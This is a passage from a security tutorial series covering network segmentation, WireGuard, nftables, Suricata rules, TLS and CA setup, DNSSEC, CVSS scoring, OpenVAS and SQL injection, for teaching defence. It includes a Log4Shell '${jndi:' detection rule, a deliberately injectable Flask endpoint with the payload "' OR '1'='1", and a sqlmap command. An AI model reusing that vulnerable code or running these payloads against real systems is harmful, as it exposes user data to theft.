---
title: "Intermediate"
weight: 10000002
date: 2026-05-21T00:00:00+07:00
draft: false
description: "IT security intermediate examples — vulnerability assessment, IAM, and security monitoring (Examples 29–57)"
tags: ["it-security", "intermediate", "by-example"]
---

## Example 29: Network Segmentation with VLANs

**What this covers:** Network segmentation isolates traffic between production, development, and
management subnets using VLAN tagging and firewall rules. Proper segmentation limits lateral
movement after a breach, containing the blast radius to one zone.

**Scenario:** A Ubuntu 22.04 host acts as an inter-VLAN router with three VLANs: VLAN 10
(production, 10.x.10.0/24), VLAN 20 (development, 10.x.20.0/24), VLAN 99 (management,
10.x.99.0/24).

```bash
# Create VLAN sub-interfaces on eth0
ip link add link eth0 name eth0.10 type vlan id 10   # => VLAN 10: production subnet
ip link add link eth0 name eth0.20 type vlan id 20   # => VLAN 20: development subnet
ip link add link eth0 name eth0.99 type vlan id 99   # => VLAN 99: management subnet

# Assign gateway IPs to each VLAN interface
ip addr add 10.x.10.1/24 dev eth0.10                 # => gateway for prod VLAN
ip addr add 10.x.20.1/24 dev eth0.20                 # => gateway for dev VLAN
ip addr add 10.x.99.1/24 dev eth0.99                 # => gateway for mgmt VLAN

# Bring interfaces up
ip link set eth0.10 up                               # => prod interface active
ip link set eth0.20 up                               # => dev interface active
ip link set eth0.99 up                               # => mgmt interface active

# Enable IP forwarding (required for inter-VLAN routing)
echo 1 > /proc/sys/net/ipv4/ip_forward              # => routing enabled; persists until reboot

# --- nftables ruleset for inter-VLAN policy ---
# Flush existing rules to start clean
nft flush ruleset                                    # => removes all prior rules

# Create filter table with forward chain
nft add table inet filter
nft add chain inet filter forward \
    '{ type filter hook forward priority 0; policy drop; }'
# => default-deny forward: all inter-VLAN traffic blocked unless explicitly allowed

# Allow established/related traffic in both directions (stateful)
nft add rule inet filter forward ct state established,related accept
# => existing sessions pass without re-evaluation (performance + correctness)

# Rule: dev may NOT reach prod (isolation)
nft add rule inet filter forward \
    ip saddr 10.x.20.0/24 ip daddr 10.x.10.0/24 drop
# => dev-to-prod traffic silently dropped

# Rule: prod may reach dev on port 5432 (DB reads from prod to dev replica) — deny everything else
nft add rule inet filter forward \
    ip saddr 10.x.10.0/24 ip daddr 10.x.20.0/24 tcp dport 5432 accept
# => narrow exception: prod queries dev DB replica only

# Rule: management subnet reaches everything (admin access)
nft add rule inet filter forward \
    ip saddr 10.x.99.0/24 accept
# => mgmt VLAN is the only zone with unrestricted access

# Verify rules are loaded correctly
nft list ruleset
# => prints full ruleset; inspect for gaps before production use
```

**Key Takeaway:** Default-deny inter-VLAN forwarding with explicit allow rules for necessary
traffic confines breaches to single network zones and prevents lateral movement across subnets.

**Why It Matters:** Flat networks allow an attacker who compromises one host to reach every other
host without restriction. VLAN segmentation with nftables enforces network-layer isolation even
when application-layer controls fail. Production environments should treat each trust zone as
hostile to its neighbors, permitting only the minimum traffic required for business functions,
logged and reviewed regularly.

---

## Example 30: WireGuard VPN Setup

**What this covers:** WireGuard establishes a modern, high-performance VPN tunnel using
public-key cryptography. This example configures both the server endpoint and a single peer
client with annotated wg0.conf files explaining each directive.

**Scenario:** A Ubuntu 22.04 server at 203.0.113.5 acts as VPN concentrator. A remote peer
client needs encrypted access to the 10.x.0.0/24 internal network.

```bash
# --- SERVER: /etc/wireguard/wg0.conf ---

# Generate server keypair (run once, store securely)
wg genkey | tee /etc/wireguard/server_private.key | wg pubkey > /etc/wireguard/server_public.key
# => server_private.key: base64 private key (never share)
# => server_public.key:  base64 public key  (share with peers)

chmod 600 /etc/wireguard/server_private.key          # => only root can read private key

# Write server config
cat > /etc/wireguard/wg0.conf << 'EOF'
[Interface]
Address    = 10.x.0.1/24          # VPN tunnel IP assigned to server
ListenPort = 51820                # UDP port WireGuard listens on
PrivateKey = <server_private_key> # paste contents of server_private.key

# Enable NAT so VPN clients reach the internet via server's eth0
PostUp   = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
# => PostUp/PostDown run on interface up/down; enables/removes NAT routing

[Peer]
# Client peer registration
PublicKey  = <client_public_key>  # paste client's public key (see peer section below)
AllowedIPs = 10.x.0.2/32          # only traffic FROM this IP is accepted from this peer
# => AllowedIPs is both routing table and cryptographic ACL
EOF

# --- PEER (CLIENT): /etc/wireguard/wg0.conf ---

# Generate client keypair on client machine
wg genkey | tee client_private.key | wg pubkey > client_public.key
# => same keypair generation; keep client_private.key on client only

cat > /etc/wireguard/wg0.conf << 'EOF'
[Interface]
Address    = 10.x.0.2/24          # VPN tunnel IP for this client
PrivateKey = <client_private_key> # paste client_private.key contents
DNS        = 10.x.0.1             # use server as DNS resolver over tunnel

[Peer]
PublicKey  = <server_public_key>  # paste server_public.key
Endpoint   = 203.0.113.5:51820   # server's public IP and WireGuard port
AllowedIPs = 0.0.0.0/0           # route ALL client traffic through VPN (full tunnel)
# => 0.0.0.0/0 = split tunnel disabled; all internet traffic via server
PersistentKeepalive = 25          # send keepalive every 25s to maintain NAT mappings
EOF

# Start WireGuard on both server and client
systemctl enable --now wg-quick@wg0
# => wg-quick reads /etc/wireguard/wg0.conf and brings tunnel up

# Verify tunnel is established (on server)
wg show wg0
# => shows: interface, public key, listening port, peer details, latest handshake, data transfer
```

**Key Takeaway:** WireGuard's cryptographic identity model means a misconfigured AllowedIPs is
both a routing error and a security hole — always set it to the minimum IP range the peer should
source.

**Why It Matters:** WireGuard replaces legacy IPsec and OpenVPN with a smaller, auditable
codebase (roughly 4,000 lines vs. hundreds of thousands). Its noise protocol handshake provides
forward secrecy and resistance to replay attacks. In practice, it enables secure remote-access
tunnels and site-to-site connectivity with negligible performance overhead, making it the
preferred choice for modern infrastructure VPN deployments.

---

## Example 31: Stateful Firewall with nftables

**What this covers:** nftables replaces iptables as the Linux kernel's primary packet-filtering
framework, offering atomic rule updates and cleaner syntax. This example builds a host-based
stateful firewall protecting a web server with explicit input, output, and forward chains.

**Scenario:** A Ubuntu 22.04 web server running nginx on ports 80/443 needs a minimal-surface
host firewall that allows SSH management and drops all other inbound traffic.

```bash
# Flush all existing rules before applying new ruleset
nft flush ruleset                                     # => clean slate; prevents rule accumulation

# --- /etc/nftables.conf (write this file, then load it) ---
cat > /etc/nftables.conf << 'EOF'
#!/usr/sbin/nft -f

# Define a single inet (IPv4+IPv6) table
table inet firewall {

  # INPUT chain: traffic destined for this host
  chain input {
    type filter hook input priority 0;
    policy drop;                    # => default deny; anything not explicitly accepted is dropped

    # Accept loopback traffic (required for local services)
    iif lo accept                   # => lo = loopback interface; internal IPC must work

    # Accept established/related connections (stateful tracking)
    ct state established,related accept
    # => conntrack handles TCP/UDP state; responses to outbound requests pass automatically

    # Drop invalid packets (malformed, out-of-state)
    ct state invalid drop           # => rejects RST injection, fragmented attacks, etc.

    # Allow ICMP for diagnostics (ping, path MTU discovery)
    ip  protocol icmp   accept      # => IPv4 ICMP: ping, TTL exceeded, unreachable
    ip6 nexthdr  icmpv6 accept      # => IPv6 ICMPv6: required for neighbor discovery

    # Allow SSH from management subnet only
    tcp dport 22 ip saddr 10.x.99.0/24 accept
    # => SSH locked to mgmt VLAN; public internet cannot reach port 22

    # Allow HTTP/HTTPS from anywhere
    tcp dport { 80, 443 } accept    # => web traffic open to all; nginx handles TLS termination

    # Log and drop anything else reaching input chain
    log prefix "nftables-drop-input: " drop
    # => dropped packets logged to kernel ring buffer; visible via journalctl -k
  }

  # OUTPUT chain: traffic originating from this host
  chain output {
    type filter hook output priority 0;
    policy accept;                  # => outbound unrestricted; tighten per compliance need
  }

  # FORWARD chain: traffic routed through this host
  chain forward {
    type filter hook forward priority 0;
    policy drop;                    # => this host is not a router; drop all forwarded packets
  }
}
EOF

# Load ruleset atomically (all-or-nothing replace)
nft -f /etc/nftables.conf           # => entire ruleset replaced in one kernel transaction

# Enable nftables service so rules persist across reboots
systemctl enable --now nftables     # => systemd loads /etc/nftables.conf on boot

# Live inspection: list all rules with handles (needed for per-rule delete)
nft list ruleset                    # => shows table, chains, rules with handle numbers
nft list chain inet firewall input  # => shows only the input chain rules
```

**Key Takeaway:** Stateful connection tracking (ct state established,related) dramatically
simplifies rulesets by allowing return traffic automatically without enumerating reply ports in
output rules.

**Why It Matters:** Host-based firewalls provide defense-in-depth when perimeter controls fail
or when an attacker gains internal network access. nftables atomic rule replacement eliminates
the window of inconsistent state that iptables rule-by-rule updates created. Logging dropped
packets into the kernel journal creates an audit trail for intrusion detection without requiring
a dedicated log daemon.

---

## Example 32: Suricata IDS Rule Writing

**What this covers:** Suricata is an open-source intrusion detection and prevention system that
inspects network traffic against rule signatures. This example writes two Suricata rules: one
detecting a port scan pattern and one detecting a common HTTP exploit attempt.

**Scenario:** Suricata runs in IDS mode (afpacket on eth0) on a Ubuntu 22.04 sensor. The rules
below go into /etc/suricata/rules/local.rules.

```bash
# --- /etc/suricata/rules/local.rules ---

# Rule 1: Detect horizontal port scan (many ports from one source in short window)
# Rule format: action proto src_ip src_port direction dst_ip dst_port (options)
alert tcp any any -> $HOME_NET any \
  (msg:"ET SCAN Horizontal Port Scan Detected"; \
   flags:S; \                        # => match TCP SYN packets only (no ACK = new connection attempt)
   threshold: type threshold, track by_src, count 20, seconds 5; \
   # => alert when same source sends 20+ SYNs within 5 seconds (threshold suppresses noise)
   classtype:attempted-recon; \      # => Suricata classifies this as reconnaissance
   sid:9000001; rev:1;)              # => unique rule ID (SID); rev tracks rule version

# Rule 2: Detect CVE-2021-44228 Log4Shell exploit attempt in HTTP User-Agent
alert http any any -> $HTTP_SERVERS any \
  (msg:"ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228) User-Agent"; \
   flow:established,to_server; \     # => match request flowing from client to server
   http.user_agent; \                # => inspect only the HTTP User-Agent header (sticky buffer)
   content:"${jndi:"; nocase; \      # => match JNDI lookup string (case-insensitive)
   # => ${jndi: prefix triggers Log4j JNDI lookup; presence in user-agent = exploit attempt
   pcre:"/\$\{jndi:(ldap|rmi|dns|iiop|corba|nds|http)/i"; \
   # => PCRE verifies JNDI scheme (ldap/rmi/dns/etc.) for higher fidelity
   classtype:attempted-user; \       # => classifies as attempted privilege escalation
   sid:9000002; rev:3;)              # => rev:3 indicates rule has been refined three times

# --- Apply and test the rules ---

# Test configuration syntax without starting Suricata
suricata -T -c /etc/suricata/suricata.yaml --set vars.address-groups.HOME_NET="[10.x.0.0/8]"
# => "-T" = test mode; exits 0 if config valid, non-zero with error details

# Reload rules in running Suricata without restart (live rule update)
kill -USR2 $(pidof suricata)         # => SIGUSR2 triggers live rule reload

# Watch alerts in real time
tail -f /var/log/suricata/fast.log
# => format: timestamp [**] [SID] msg [**] classification priority src -> dst
# => Example: 05/21 10:23:01 [**] [9000002] ET EXPLOIT Apache Log4j... [**] ...

# Count alerts by SID to find noisy rules
awk '{print $3}' /var/log/suricata/fast.log | sort | uniq -c | sort -rn | head -10
# => reveals which rules fire most; high-count rules may need threshold tuning
```

**Key Takeaway:** Suricata rules combine protocol awareness, content matching, and threshold
controls — all three elements are needed to produce high-fidelity alerts without overwhelming
analysts with false positives.

**Why It Matters:** Signature-based IDS remains the fastest path to detecting known attack
patterns. Writing custom local rules extends vendor rulesets to cover organization-specific
assets, internal protocols, and newly disclosed CVEs before public rule packages are updated.
Threshold tuning and PCRE verification reduce alert fatigue, which is the primary reason
analysts disable IDS alerts in practice, leaving organizations blind to real intrusions.

---

## Example 33: TLS Certificate Chain Validation

**What this covers:** TLS certificate chain validation confirms that a server certificate is
signed by a trusted CA, that the chain is complete and ordered, and that no certificate has
expired. Broken chains are a common deployment error that causes silent connection failures.

**Scenario:** A web server at api.example.com presents a certificate. The operator needs to
verify the full chain before deployment using openssl on Ubuntu 22.04.

```bash
# Retrieve the server's full certificate chain over the wire
openssl s_client -connect api.example.com:443 -showcerts </dev/null 2>/dev/null \
  | sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' \
  > /tmp/chain.pem
# => /tmp/chain.pem contains all PEM certificates sent by server (leaf + intermediates)
# => sed extracts every PEM block; server should send: leaf cert, intermediate CA(s)

# Count how many certificates are in the chain file
grep -c "BEGIN CERTIFICATE" /tmp/chain.pem
# => typical result: 2 (leaf + one intermediate)
# => result of 1 means server sends leaf only — broken chain for clients without cached intermediate

# Extract just the leaf (first) certificate for inspection
openssl x509 -in /tmp/chain.pem -noout -text | head -60
# => shows: Subject, Issuer, validity dates, SANs, key usage, signature algorithm

# Check certificate validity dates
openssl x509 -in /tmp/chain.pem -noout -dates
# => notBefore: when cert becomes valid
# => notAfter:  expiry date; if in the past, all clients will reject the cert

# Verify Subject Alternative Names match the domain
openssl x509 -in /tmp/chain.pem -noout -ext subjectAltName
# => DNS:api.example.com, DNS:*.example.com
# => if api.example.com is NOT in the SAN list, browsers show ERR_CERT_COMMON_NAME_INVALID

# Download the Mozilla CA bundle for chain verification
curl -s https://curl.se/ca/cacert.pem -o /tmp/cacert.pem
# => cacert.pem: trusted root CAs; production systems use distro bundle at /etc/ssl/certs/ca-certificates.crt

# Verify the full chain against trusted roots
openssl verify -CAfile /tmp/cacert.pem -untrusted /tmp/chain.pem /tmp/chain.pem
# => "chain.pem: OK" means chain validates successfully
# => error 20 = unable to get local issuer certificate (missing intermediate)
# => error 10 = certificate has expired

# Check OCSP status of the leaf certificate
OCSP_URI=$(openssl x509 -in /tmp/chain.pem -noout -ocsp_uri)
# => extracts OCSP responder URL from cert's Authority Information Access extension

openssl ocsp \
  -issuer <(openssl x509 -in /tmp/chain.pem -noout | sed '1d') \
  -cert /tmp/chain.pem \
  -url "$OCSP_URI" \
  -text 2>&1 | grep -E "Cert Status|This Update|Next Update"
# => "Cert Status: good" means cert not revoked
# => "Cert Status: revoked" means cert is revoked; do not deploy
```

**Key Takeaway:** A certificate that validates with openssl verify -CAfile but fails in
browsers usually means the server omits the intermediate CA — always include the full chain in
the server's TLS configuration.

**Why It Matters:** Broken certificate chains cause hard-to-diagnose outages because different
clients handle missing intermediates differently: some cache them, others reject the connection.
Certificate expiry accounts for a significant fraction of production TLS outages, making
automated expiry monitoring essential. OCSP checking ensures revoked certificates are detected
before deployment rather than after a security incident.

---

## Example 34: Setting Up a Simple Internal CA

**What this covers:** An internal certificate authority issues certificates to internal services
without relying on public CAs or paying per-certificate fees. This example configures an openssl
CA directory structure and issues a service certificate with the proper extensions.

**Scenario:** A team needs an internal CA to issue TLS certificates for microservices on a
10.x.0.0/8 private network. The CA runs on an air-gapped Ubuntu 22.04 management host.

```bash
# Create CA directory structure following OpenSSL convention
mkdir -p /etc/ssl/myca/{certs,crl,newcerts,private,requests}
chmod 700 /etc/ssl/myca/private             # => private key directory accessible only by root
touch /etc/ssl/myca/index.txt               # => tracks all issued certs (openssl CA database)
echo 1000 > /etc/ssl/myca/serial           # => next certificate serial number (hex)
echo 1000 > /etc/ssl/myca/crlnumber        # => next CRL number

# Generate CA root private key (4096-bit RSA; use EC for production)
openssl genrsa -aes256 -out /etc/ssl/myca/private/ca.key.pem 4096
# => prompts for passphrase; protects CA key at rest (critical: losing passphrase = CA unusable)
chmod 400 /etc/ssl/myca/private/ca.key.pem  # => read-only for root

# Create CA root certificate (self-signed, 10-year validity)
openssl req -key /etc/ssl/myca/private/ca.key.pem \
  -new -x509 -days 3650 \
  -sha256 \
  -extensions v3_ca \
  -out /etc/ssl/myca/certs/ca.cert.pem \
  -subj "/C=ID/O=MyOrg Internal CA/CN=MyOrg Root CA"
# => self-signed cert: Issuer == Subject (root CA property)
# => 3650 days = ~10 years; root CAs use long validity

# --- Issue a service certificate ---

# Generate private key for the service (no passphrase; service must read it at startup)
openssl genrsa -out /etc/ssl/myca/private/api-service.key.pem 2048
# => 2048-bit RSA for service certs is acceptable (CA uses 4096 for defense in depth)

# Create CSR (Certificate Signing Request)
openssl req -new -key /etc/ssl/myca/private/api-service.key.pem \
  -out /etc/ssl/myca/requests/api-service.csr.pem \
  -subj "/C=ID/O=MyOrg/CN=api.internal.example.com"
# => CSR contains public key + subject; sent to CA for signing

# Create extension file defining SAN and key usage for service cert
cat > /tmp/api-service-ext.cnf << 'EOF'
[v3_server]
subjectAltName         = DNS:api.internal.example.com, IP:10.x.10.50
keyUsage               = critical, digitalSignature, keyEncipherment
extendedKeyUsage       = serverAuth
basicConstraints       = critical, CA:FALSE
# => CA:FALSE prevents this cert from signing other certs (leaf cert only)
EOF

# Sign the CSR with the CA (1-year validity for service certs)
openssl ca \
  -config /etc/ssl/openssl.cnf \
  -extensions v3_server \
  -extfile /tmp/api-service-ext.cnf \
  -days 365 \
  -notext \
  -md sha256 \
  -in /etc/ssl/myca/requests/api-service.csr.pem \
  -out /etc/ssl/myca/certs/api-service.cert.pem
# => prompts for CA passphrase; signs CSR and records in index.txt
# => "-notext" omits human-readable header from cert file (cleaner for parsing)

# Verify issued cert subject and extensions
openssl x509 -in /etc/ssl/myca/certs/api-service.cert.pem -noout -text \
  | grep -A5 "Subject Alternative Name"
# => confirms SAN contains DNS:api.internal.example.com and IP:10.x.10.50
```

**Key Takeaway:** Internal CAs work only if clients trust the root certificate — distribute
/etc/ssl/myca/certs/ca.cert.pem to every host and container via configuration management before
issuing any service certificates.

**Why It Matters:** Public CAs cannot issue certificates for internal domains or RFC 1918 IP
addresses. Internal CAs solve this while keeping certificate issuance under organizational
control. Short service certificate validity (365 days or less) limits the damage from key
compromise. Storing the CA private key on an air-gapped host or HSM prevents attackers from
using a compromised management server to issue fraudulent certificates.

---

## Example 35: DNSSEC Zone Signing

**What this covers:** DNSSEC adds cryptographic signatures to DNS records, allowing resolvers to
verify that responses are authentic and have not been tampered with in transit. This example
shows the dig output for a DNSSEC-signed zone and explains the DS record used in the chain of
trust.

**Scenario:** The domain example.com has DNSSEC enabled. An operator validates the chain of
trust from root to example.com using dig on Ubuntu 22.04.

```bash
# Query a DNSSEC-signed domain and request DNSSEC records
dig +dnssec +multiline example.com A
# => +dnssec  requests RRSIG records (signatures) alongside answer records
# => +multiline formats output for readability

# Expected output (annotated):
# ;; ANSWER SECTION:
# example.com. 3600 IN A 93.184.216.34
# => A record: example.com resolves to 93.184.216.34; TTL 3600 seconds

# example.com. 3600 IN RRSIG A 8 2 3600 (
#     20260621000000 20260521000000 12345 example.com.
#     Base64SignatureData== )
# => RRSIG covers the A record set
# => "8" = algorithm 8 (RSASHA256)
# => "2" = number of labels in owner name
# => 20260621000000 = signature expiry (YYYYMMDDHHMMSS)
# => 20260521000000 = signature inception
# => 12345 = Key Tag (identifies which DNSKEY was used to sign)
# => Base64SignatureData = cryptographic signature

# Query DNSKEY records to see the zone signing keys
dig +dnssec +multiline example.com DNSKEY
# ;; ANSWER SECTION:
# example.com. 3600 IN DNSKEY 256 3 8 (
#     AwEAAb...publickey... )
# => flag 256 = Zone Signing Key (ZSK): signs RRsets
# example.com. 3600 IN DNSKEY 257 3 8 (
#     AwEAAc...publickey... )
# => flag 257 = Key Signing Key (KSK): signs DNSKEY RRset; KSK public key is hashed into DS record

# Query the DS record from the parent zone (example.com's DS in the .com zone)
dig +dnssec DS example.com
# ;; ANSWER SECTION:
# example.com. 86400 IN DS 12345 8 2 SHA256HashOfKSKPublicKey
# => DS = Delegation Signer record stored in PARENT zone (.com)
# => 12345 = Key Tag matching the KSK above
# => "8" = algorithm (RSASHA256)
# => "2" = digest type 2 = SHA-256
# => SHA256HashOfKSKPublicKey = SHA-256 hash of the KSK's public key material

# Perform full DNSSEC chain validation using a validating resolver
dig +dnssec +cd=no @8.8.8.8 example.com A
# => +cd=no = Checking Disabled = FALSE (resolver performs validation)
# => if AD bit is set in response flags, the resolver validated the chain successfully

# Check AD (Authenticated Data) bit in response
dig +dnssec example.com A | grep "flags:"
# => flags: qr rd ra ad  ← "ad" flag = answer is DNSSEC authenticated
# => if "ad" is absent, DNSSEC validation failed or zone is not signed
```

**Key Takeaway:** The chain of trust for DNSSEC runs from the root zone's KSK down through
DS records in each parent zone to the child zone's DNSKEY — a break anywhere in the chain
causes DNSSEC-validating resolvers to return SERVFAIL.

**Why It Matters:** DNS cache poisoning attacks (Kaminsky attack and successors) redirect users
to attacker-controlled servers without any visible warning. DNSSEC eliminates this by making DNS
responses cryptographically verifiable. While DNSSEC does not encrypt DNS traffic (use DNS over
TLS or HTTPS for that), it ensures integrity and authenticity of resolution results, which is
especially critical for domains hosting authentication endpoints or software update servers.

---

## Example 36: CVSS 4.0 Score Calculation Walkthrough

**What this covers:** CVSS 4.0 (Common Vulnerability Scoring System) provides a standardized
method for scoring the severity of security vulnerabilities using Base, Threat, and Environmental
metric groups. This example manually calculates the CVSS 4.0 Base score for CVE-2021-44228
(Log4Shell).

**Scenario:** A security analyst needs to calculate a CVSS 4.0 score for CVE-2021-44228 to
prioritize remediation in their organization's Java-based microservices environment.

```bash
# CVE-2021-44228: Apache Log4j2 JNDI RCE (Log4Shell)
# Affected: Log4j2 2.0-beta9 through 2.14.1
# Impact: Unauthenticated remote code execution via crafted log input

# --- CVSS 4.0 Base Metrics (annotated) ---
# Base metrics describe the vulnerability's intrinsic characteristics

# Attack Vector (AV): Network
# => AV:N — attacker exploits over the network, no physical/local access needed
# => options: N(etwork) > A(djacent) > L(ocal) > P(hysical) — N is worst

# Attack Complexity (AC): Low
# => AC:L — no special conditions; any internet-exposed instance is exploitable
# => options: L(ow) > H(igh) — Low means reliable, repeatable exploitation

# Attack Requirements (AT): None  [new in CVSS 4.0; replaces part of CVSS 3.x AC]
# => AT:N — no prerequisite deployment conditions required for exploitation
# => options: N(one) > P(resent)

# Privileges Required (PR): None
# => PR:N — attacker needs no authentication; a single HTTP request triggers RCE
# => options: N(one) > L(ow) > H(igh) — None is worst

# User Interaction (UI): None
# => UI:N — no victim action needed; server processes malicious input automatically
# => options: N(one) > P(assive) > A(ctive) — None is worst

# Vulnerable System Confidentiality (VC): High
# => VC:H — full read access to system memory, env vars, secrets

# Vulnerable System Integrity (VI): High
# => VI:H — attacker executes arbitrary code; can modify any file

# Vulnerable System Availability (VA): High
# => VA:H — attacker can terminate the JVM, crash the service, deploy ransomware

# Subsequent System Confidentiality (SC): High
# => SC:H — Log4j runs inside microservices with internal network access
# => successful exploitation enables lateral movement to databases, secrets stores

# Subsequent System Integrity (SI): High
# => SI:H — attacker can modify downstream systems reached from the compromised host

# Subsequent System Availability (SA): High
# => SA:H — attacker can cascade failures across dependent services

# --- CVSS 4.0 Vector String ---
CVSS_VECTOR="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
echo "$CVSS_VECTOR"
# => CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H

# --- Score Interpretation ---
# Base Score: 10.0 (Critical)
# => Log4Shell scores the maximum CVSS 4.0 Base score
# => All impact metrics High + Network AV + no authentication = perfect storm

# Use NVD calculator to verify (web tool)
echo "Verify at: https://nvd.nist.gov/vuln-metrics/cvss/v4-calculator?vector=${CVSS_VECTOR}"

# --- Threat Metrics (contextual adjustment) ---
# Exploit Maturity (E): Active (functional exploit widely available)
THREAT_VECTOR="${CVSS_VECTOR}/E:A"
# => E:A (Active) maintains the score; E:U (Unreported) would lower it
# => Use threat metrics to adjust for exploit availability in your context

# --- Environmental Metrics (organizational adjustment) ---
# Modify score based on whether your org's systems are reachable and have compensating controls
# Example: if vulnerable system is not internet-facing, lower Attack Vector to Local
ENV_VECTOR="${THREAT_VECTOR}/MAV:L"
# => MAV:L = Modified Attack Vector: Local — reduces score if system is air-gapped
# => Environmental score would drop from 10.0 to ~7.x with this modification
```

**Key Takeaway:** CVSS 4.0's new Subsequent System metrics (SC/SI/SA) capture blast-radius
impact beyond the directly vulnerable component, which is critical for microservice environments
where one compromise enables lateral movement.

**Why It Matters:** CVSS scores drive patch prioritization decisions in most organizations. A
perfect 10.0 score like Log4Shell's demands immediate emergency response: identify all instances
across the fleet, apply patches or mitigations within hours, not the normal patch cycle of days
or weeks. Environmental metrics allow teams to adjust published scores to reflect actual
organizational exposure, avoiding both over-response to non-exposed systems and under-response to
internet-facing ones.

---

## Example 37: Vulnerability Scanning with OpenVAS

**What this covers:** OpenVAS (via Greenbone Community Edition) performs authenticated network
vulnerability scans and produces XML reports with severity breakdowns. This example shows how to
launch a scan via CLI and parse the XML report to extract critical findings.

**Scenario:** A security team runs a weekly authenticated scan of 10.x.10.0/24 (production
subnet) using OpenVAS on an Ubuntu 22.04 GVM host. The scan results are parsed for remediation
triage.

```bash
# Start GVM services (Greenbone Vulnerability Manager)
systemctl start gvmd ospd-openvas
# => gvmd: management daemon; handles scan config, targets, users, reports
# => ospd-openvas: OpenVAS scanner daemon; performs actual vulnerability checks

# Wait for feed sync (first run only — NVT feed download takes 15-30 minutes)
gvm-check-setup 2>&1 | tail -5
# => output confirms: "GVM is ready to be used" when setup complete

# Create a scan target for the production subnet
gvm-cli --gmp-username admin --gmp-password changeme socket \
  --xml "<create_target><name>prod-subnet</name><hosts>10.x.10.0/24</hosts></create_target>"
# => returns: <create_target_response id="TARGET-UUID" status="201"/>
# => TARGET-UUID used in scan task creation

# Create a scan task using Full and Fast scan config (preset: 698...)
TARGET_UUID="<paste-target-uuid>"
gvm-cli socket --xml \
  "<create_task>
     <name>prod-weekly-scan</name>
     <config id=\"698f691e-7489-11df-9d8c-002264764cea\"/>
     <target id=\"${TARGET_UUID}\"/>
   </create_task>"
# => 698f... UUID = "Full and Fast" scan configuration (covers all common CVEs)
# => returns: <create_task_response id="TASK-UUID" status="201"/>

TASK_UUID="<paste-task-uuid>"
# Start the scan
gvm-cli socket --xml "<start_task task_id=\"${TASK_UUID}\"/>"
# => returns: <start_task_response report_id="REPORT-UUID" status="202"/>

# Poll scan status until complete
gvm-cli socket --xml "<get_tasks task_id=\"${TASK_UUID}\"/>" \
  | xmllint --xpath '//status/text()' -
# => status cycles: Requested → Queued → Running → Done
# => run this every 60 seconds until "Done"

REPORT_UUID="<paste-report-uuid>"
# Export XML report
gvm-cli socket \
  --xml "<get_reports report_id=\"${REPORT_UUID}\" filter=\"levels=hmlg\" format_id=\"a994b278-1f62-11e1-96ac-406186ea4fc5\"/>" \
  > /tmp/scan-report.xml
# => format_id for XML (native GVM XML format)
# => filter levels=hmlg: High, Medium, Low, Log (omits Info noise)

# Parse report: count findings by severity
python3 - << 'EOF'
import xml.etree.ElementTree as ET
tree = ET.parse('/tmp/scan-report.xml')
root = tree.getroot()
severity_counts = {}
for result in root.iter('result'):
    severity_el = result.find('severity')
    if severity_el is not None:
        score = float(severity_el.text or 0)
        # Map CVSS score to severity band
        band = 'Critical' if score >= 9.0 else \
               'High'     if score >= 7.0 else \
               'Medium'   if score >= 4.0 else 'Low'
        severity_counts[band] = severity_counts.get(band, 0) + 1
for band, count in sorted(severity_counts.items()):
    print(f"{band}: {count}")
EOF
# => Critical: 2
# => High: 7
# => Medium: 23
# => Low: 41
# => start remediation with Critical findings before moving to High

# Extract CVE identifiers from Critical findings
xmllint --xpath '//result[severity/text()>=9.0]//nvt/cve/text()' /tmp/scan-report.xml 2>/dev/null
# => CVE-2021-44228, CVE-2022-22965 — direct input for patch prioritization
```

**Key Takeaway:** Vulnerability scanner output requires triage — a raw count of findings is
meaningless without severity banding and cross-referencing with asset criticality to determine
actual remediation priority.

**Why It Matters:** Vulnerability scanning provides a systematic inventory of known weaknesses
across a network, replacing ad hoc guesswork with evidence-based prioritization. Critical findings
(CVSS 9.0+) on internet-facing systems demand immediate patching, while Medium findings on
internal-only systems can follow the normal patch cycle. Automating XML report parsing enables
integration with ticketing systems like Jira, creating traceable remediation workflows with
accountable owners and deadlines.

---

## Example 38: SQL Injection Detection

**What this covers:** SQL injection occurs when user input is concatenated into SQL queries
without sanitization, allowing attackers to manipulate query logic. This example shows a
vulnerable Flask endpoint, the parameterized fix, and sqlmap output confirming the vulnerability
and its remediation.

**Scenario:** A Python Flask API exposes a user lookup endpoint. A security review identifies
the endpoint as vulnerable to SQL injection. The team confirms the vulnerability with sqlmap,
applies the fix, and verifies the fix is effective.

```python
# --- VULNERABLE endpoint (DO NOT USE IN PRODUCTION) ---
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/api/user')
def get_user_vulnerable():
    username = request.args.get('username', '')
    # VULNERABILITY: string formatting injects user input directly into SQL
    query = f"SELECT id, email FROM users WHERE username = '{username}'"
    # => if username = "' OR '1'='1", query becomes:
    # => SELECT id, email FROM users WHERE username = '' OR '1'='1'
    # => '1'='1' is always true; returns ALL users (authentication bypass)

    conn = sqlite3.connect('users.db')
    cursor = conn.execute(query)       # => executes attacker-controlled SQL
    results = cursor.fetchall()
    return jsonify(results)            # => leaks entire user table to attacker
    # => worse payloads: UNION-based exfiltration, stacked queries for writes


# --- PATCHED endpoint (parameterized query) ---
@app.route('/api/user/safe')
def get_user_safe():
    username = request.args.get('username', '')
    # FIX: parameterized query; driver handles escaping/binding
    query = "SELECT id, email FROM users WHERE username = ?"
    # => "?" is a placeholder; value bound separately from SQL text
    # => SQL engine treats the value as a literal string, never as SQL syntax

    conn = sqlite3.connect('users.db')
    cursor = conn.execute(query, (username,))
    # => (username,) is the parameter tuple; driver escapes it safely
    # => even "' OR '1'='1" is treated as a literal string; no rows returned
    results = cursor.fetchall()
    return jsonify(results)            # => only returns matching user or empty list
```

```bash
# --- sqlmap: confirm the vulnerability on the vulnerable endpoint ---
sqlmap -u "http://localhost:5000/api/user?username=test" \
  --batch \                            # => non-interactive: accept all defaults
  --level=3 \                         # => test level 3 (more payloads than default 1)
  --risk=1 \                          # => risk=1: safe payloads only (no destructive tests)
